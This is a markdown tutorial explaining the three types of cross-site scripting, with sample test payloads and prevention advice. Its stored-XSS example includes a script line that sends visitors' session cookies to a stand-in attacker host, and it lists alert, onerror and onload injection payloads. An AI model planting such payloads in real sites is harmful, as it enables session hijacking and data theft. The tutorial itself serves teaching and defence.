# Cross-Site Scripting (XSS)

## What is XSS?
**Cross-Site Scripting (XSS)** is an injection vulnerability that occurs when an application includes untrusted user input inside a webpage without proper escaping or validation. This allows an attacker to execute malicious **JavaScript** inside the victim's browser.

---

## The 3 Types of XSS

### 1. Reflected XSS (Non-Persistent)
The malicious script is reflected off the web server immediately via a URL parameter.
- **Example:** User clicks:
  `https://example.com/search?q=<script>alert(document.cookie)</script>`
- If the search page displays *"You searched for `<script>alert(...)`"*, the script runs immediately.

---

### 2. Stored XSS (Persistent - High Risk)
The malicious payload is stored directly in the server's database (e.g., in a blog comment or user profile field) and executed whenever other users view that page.
- **Example:** Attacker saves a comment:
  `Awesome post! <script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>`
- Every single user who visits the blog post will have their session cookies stolen.

---

### 3. DOM-Based XSS
The vulnerability exists entirely in client-side JavaScript code processing user input, without hitting the backend server.
- **Example:** React or raw JS updating `innerHTML` directly from URL hash values:
  `document.getElementById("welcome").innerHTML = location.hash;`

---

## Testing for XSS (Sample Payloads)
Try inputting these tags in input fields (comments, search, profile forms):

```html
<!-- Simple alert box test -->
<script>alert('XSS')</script>

<!-- Event handlers trigger on image load failure -->
<img src="x" onerror="alert(1)">

<!-- Direct SVG injection -->
<svg onload="alert('XSS')">
```

---

## How to Prevent XSS
- **Output Encoding:** Encode all variables before rendering them in the DOM (convert `<` to `&lt;`, `>` to `&gt;`).
- **Use Secure Frameworks:** React/Angular escape variables by default. Avoid bypass options like `dangerouslySetInnerHTML`.
- **HTTPOnly Cookies:** Set `HttpOnly` flags on session cookies so JavaScript scripts cannot access them.

---

## 📌 Key Takeaways
- XSS allows attackers to hijack sessions, deface websites, and capture keystrokes.
- Output encoding is your primary defense line.
- Always validate and sanitize all HTML inputs.
